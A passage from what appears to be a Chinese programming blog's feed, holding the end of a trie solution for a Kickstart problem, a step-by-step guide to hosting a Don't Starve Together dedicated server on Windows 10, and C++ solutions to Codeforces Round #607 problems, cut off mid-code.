class="token number">0</span><span class="token punctuation">,</span> sz <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sz<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'A'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'A'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">newnode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                par<span class="token punctuation">[</span>next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'A'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> now<span class="token punctuation">;</span>                dep<span class="token punctuation">[</span>next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'A'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> dep<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            now <span class="token operator">=</span> next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'A'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        ed<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">work</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> L<span class="token punctuation">;</span> i<span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            ans <span class="token operator">+=</span> ed<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">/</span> K <span class="token operator">*</span> dep<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            ed<span class="token punctuation">[</span>par<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+=</span> ed<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%</span> K<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Trie tree<span class="token punctuation">;</span><span class="token keyword">char</span> s<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token keyword">int</span> T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    tree<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> tree<span class="token punctuation">.</span>N <span class="token operator">>></span> tree<span class="token punctuation">.</span>K<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> tree<span class="token punctuation">.</span>N<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> tree<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Case #"</span> <span class="token operator">&lt;&lt;</span> T <span class="token operator">&lt;&lt;</span> <span class="token string">": "</span> <span class="token operator">&lt;&lt;</span> tree<span class="token punctuation">.</span><span class="token function">work</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//  freopen("in","r",stdin);</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> T <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> T<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> T<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token function">solve</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kickstart </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>steam饥荒服务器的搭建(win10)</title>
      <link href="/2020/01/27/%E9%A5%A5%E8%8D%92%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%90%AD%E5%BB%BA-win10/"/>
      <url>/2020/01/27/%E9%A5%A5%E8%8D%92%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%90%AD%E5%BB%BA-win10/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br><span id="more"></span></p><h1 id="1-原因"><a href="#1-原因" class="headerlink" title="1. 原因"></a>1. 原因</h1><p>​        过年闲来无事和朋友打饥荒(Don’t Starve Together Dedicated 以下简称DST)的时候发现异常卡顿，排除掉搭建服务器主机配置的问题，只有可能是网络的问题。引用大神 PaintDream 的<a href="https://www.zhihu.com/question/29937042/answer/118687356">回答</a>：</p><blockquote><p>饥荒的联机版使用自制的RPC来完成通信，这个机制基本上就是一层简单的封装，没有针对网络传输做优化。所有的数据包必须由运行在服务器端的模拟器上顺序执行，这大大放大了网络延迟对游戏的影响。<br>另外，由于模拟器本身优化不足，在地图较大或者MOD较多的时候，服务器可能因CPU单核计算能力不足而卡顿，导致所有客户端都变卡。</p></blockquote><p>和高赞<a href="">回答</a>：</p><blockquote><p>荒联机版会卡确实主要是这个游戏的问题，其实网速和主机关系不大。<br>其实题主搭一个独立服务器就不卡了，这个独立服务器不需要跑在一个独立的主机上，只需要在题主的电脑上单独跑一个服务器进程，然后所有人连入世界就可以了。亲测不卡！</p></blockquote><p>我决定搭建一个本地win 服务器，来更好的玩耍。</p><h1 id="2-步骤"><a href="#2-步骤" class="headerlink" title="2. 步骤"></a>2. 步骤</h1><h2 id="1-下载软件"><a href="#1-下载软件" class="headerlink" title="(1). 下载软件"></a>(1). 下载软件</h2><ul><li>Don’t Starve Together（steam库中的游戏）</li><li>Don’t Starve Together Dedicated Server （steam库中的工具）</li></ul><h2 id="2-复制mod"><a href="#2-复制mod" class="headerlink" title="(2). 复制mod"></a>(2). 复制mod</h2><ul><li>找到 DST 安装目录和DSTS(Don’t Starve Together Dedicated Server)安装目录，将DST中的mods文件夹中 worksshop 开头的文件夹复制到 DSTS中的mods文件夹。</li><li>可以右键单机 steam 库中的DST，单机属性-&gt;本地文件-&gt;浏览本地文件，快速找到安装目录。</li></ul><h2 id="3-找到存档"><a href="#3-找到存档" class="headerlink" title="(3). 找到存档"></a>(3). 找到存档</h2><ul><li>打开DST，选择创建游戏，选好需要使用的mods，然后选择创建。<img src="2_3_1.jpg" alt="avatar"></li><li><p>然后返回，选择数据按钮，选择对应的存档，需要注意的是，他的排序是按照顺序的，即排第一个存档显示的就是第一个Cluster_1。<img src="2_3_2.png" alt="avatar"></p></li><li><p>然后选择你的存档，复制到上一个文件夹，并且在该文件夹中新建一个 cluster_token.txt  (原本就有的不用新建)</p></li></ul><h2 id="4-寻找服务器令牌"><a href="#4-寻找服务器令牌" class="headerlink" title="(4). 寻找服务器令牌"></a>(4). 寻找服务器令牌</h2><ul><li><ol><li><p>点击游戏界面账号按钮 ,就会有一个界面</p><p><img src="2_4_1.jpg" alt="avatar" style="zoom:50%;" /></p></li><li><p>点击页面的上方的游戏按钮，</p></li><li><p>点击饥荒联机版的游戏服务器，添加服务器，名称随意。</p><p><img src="2_4_2.png" alt="avatar" style="zoom:50%;" /></p></li><li><p>将令牌复制，并保存到步骤(3)中的 cluster_token.txt 中。<img src="2_4_3.png" alt="avatar" style="zoom:50%;" /></p></li></ol></li></ul><h2 id="5-启动快捷方式"><a href="#5-启动快捷方式" class="headerlink" title="(5). 启动快捷方式"></a>(5). 启动快捷方式</h2><ol><li><p>在DSTS文件夹中，打开  /bin/scripts ，复制一份其中的bat文件，然后更改其中的代码。</p><p><img src="2_5_1.png" alt="avatar"></p><p>将红框中的代码改成</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-cluster</span> 你的存档名 <span class="token parameter variable">-shard</span> Master<span class="token parameter variable">-cluster</span> 你的存档名 <span class="token parameter variable">-shard</span> Caves</code></pre><pre><code>2. 然后打开bat，完成创建服务器。</code></pre></li></ol><h2 id="6-开始"><a href="#6-开始" class="headerlink" title="(6).  开始"></a>(6).  开始</h2><p>​        打开游戏，浏览游戏，选择你的游戏，加入！</p><h1 id="3-遇到的问题"><a href="#3-遇到的问题" class="headerlink" title="3. 遇到的问题"></a>3. 遇到的问题</h1><h2 id="1-联机mod失效"><a href="#1-联机mod失效" class="headerlink" title="(1). 联机mod失效"></a>(1). 联机mod失效</h2><p>​        我在server_log.txt 中 ，发现了</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>00:00:20<span class="token punctuation">]</span>: <span class="token punctuation">[</span>Warning<span class="token punctuation">]</span> Could not confirm port <span class="token number">10999</span> is <span class="token function">open</span> <span class="token keyword">in</span> the firewall. <span class="token punctuation">[</span>00:00:20<span class="token punctuation">]</span>: <span class="token punctuation">[</span>Shard<span class="token punctuation">]</span> Shard server mode disabled by configuration <span class="token function">file</span><span class="token punctuation">[</span>00:00:20<span class="token punctuation">]</span>: Could not load mod_config_data/modconfiguration_workshop-378160973<span class="token punctuation">[</span>00:00:20<span class="token punctuation">]</span>: Could not load mod_config_data/modconfiguration_workshop-684098549<span class="token punctuation">[</span>00:00:20<span class="token punctuation">]</span>: Could not load mod_config_data/modconfiguration_workshop-553665029<span class="token punctuation">[</span>00:00:20<span class="token punctuation">]</span>: Could not load mod_config_data/modconfiguration_workshop-786556008</code></pre><p>​        大概率是端口冲突，打开之前复制的存档位置，打开master 文件夹，打开server.ini 文件，更改server_port 的数值即可。</p><p>​    </p>]]></content>
      
      
      <categories>
          
          <category> 游戏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 游戏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Round #607 (Div. 2)</title>
      <link href="/2020/01/03/Codeforces-Round-607-Div-2/"/>
      <url>/2020/01/03/Codeforces-Round-607-Div-2/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br><span id="more"></span></p><h3 id="A-Suffix-Three"><a href="#A-Suffix-Three" class="headerlink" title="A. Suffix Three"></a><a href="https://codeforces.com/contest/1281/problem/A">A. Suffix Three</a></h3><ul><li>题意：<br>给定一个字符串，结尾有标识符，让你输出其类型。</li><li>题解&amp;代码：<br>直接按照题意模拟即可。</li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cmath></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdio></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstring></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;queue></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">db</span> <span class="token expression"><span class="token keyword">double</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">clr</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token function">memset</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">vi</span> <span class="token expression">vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">5e5</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> t<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">int</span> ans<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>n<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        string s<span class="token punctuation">;</span>        cin <span class="token operator">>></span> s<span class="token punctuation">;</span>        <span class="token keyword">int</span> len <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>len <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'p'</span><span class="token punctuation">)</span>            ans <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>len <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'d'</span> <span class="token operator">||</span> s<span class="token punctuation">[</span>len <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'m'</span><span class="token punctuation">)</span>            ans <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            ans <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ans <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"FILIPINO"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>ans <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"JAPANESE"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">else</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"KOREAN"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="B-Azamon-Web-Services"><a href="#B-Azamon-Web-Services" class="headerlink" title="B. Azamon Web Services"></a><a href="https://codeforces.com/contest/1281/problem/B">B. Azamon Web Services</a></h3><ul><li>题意：<br>给定两个字符串A，B，问最多交换1次A中的两个字符，然后使得A的字典序大于B的字典序，若能则输出A的字符。</li><li>题解&amp;代码：<br>贪心求解。假设$s<em>{pos}$ 是A中的一个字符，只要使得下标$pos$最小，选择$s</em>{pos}$ 以后的最小的字典序的字符，并且交换即可。</li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> t<span class="token punctuation">;</span>string s1<span class="token punctuation">,</span> s2<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> x<span class="token punctuation">;</span>    <span class="token keyword">int</span> pos<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> vec<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>n<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> s1 <span class="token operator">>></span> s2<span class="token punctuation">;</span>        <span class="token keyword">int</span> len <span class="token operator">=</span> s1<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">=</span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pos <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        vec<span class="token punctuation">[</span>len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">=</span> s1<span class="token punctuation">[</span>len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        vec<span class="token punctuation">[</span>len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>pos <span class="token operator">=</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> len <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>vec<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">></span> s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">=</span> s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pos <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span>            <span class="token punctuation">&#123;</span>                vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">=</span> vec<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">;</span>                vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pos <span class="token operator">=</span> vec<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>pos<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> vec<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">int</span> len <span class="token operator">=</span> vec<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>pos<span class="token punctuation">;</span>                <span class="token function">swap</span><span class="token punctuation">(</span>s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s1<span class="token punctuation">[</span>len<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s1 <span class="token operator">&lt;</span> s2<span class="token punctuation">)</span>            cout <span class="token operator">&lt;&lt;</span> s1 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">else</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"---"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="C-Cut-and-Paste"><a href="#C-Cut-and-Paste" class="headerlink" title="C. Cut and Paste"></a><a href="https://codeforces.com/contest/1281/problem/C">C. Cut and Paste</a></h3><ul><li><p>题意：<br>给定一个数$n$ 和一段由 $1,2,3$ 组成的字符串$s$ 。给定一个数$l=0$ ，进行如下操作:</p><p>1、$l++$</p><p>2、将$s<em>{l}$ 右边的（包括$s_l$ 本身）复制$s</em>{l}-1$ 次，并添加到字符串$s$ 的末端。</p><p>3、重复操作1，直到$l=n$ </p></li><li><p>题解&amp;代码：<br>模拟+数学。因为数据范围$n&lt;10^6$ ,所以考虑分数据范围写法，先按照题目要求将字符串$s$ 的长度增长到大于$n$ 的长度，之后使用数学公式即可完成。（我发现我自己的代码写的太菜了，题解的代码写的非常简洁QAQ，STL大法好）</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdio></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstring></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cmath></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;queue></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">db</span> <span class="token expression"><span class="token keyword">double</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">clr</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token function">memset</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">vi</span> <span class="token expression">vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token keyword">const</span> ll mod <span class="token operator">=</span> <span class="token number">1e9</span> <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> t<span class="token punctuation">,</span> len<span class="token punctuation">,</span> i<span class="token punctuation">;</span>ll ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//freopen("out", "w", stdout);</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> t<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>t<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        string s<span class="token punctuation">;</span>        cin <span class="token operator">>></span> n <span class="token operator">>></span> s<span class="token punctuation">;</span>        ans <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span> <span class="token function">_s</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> tmp <span class="token operator">=</span> _s<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'1'</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>_s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 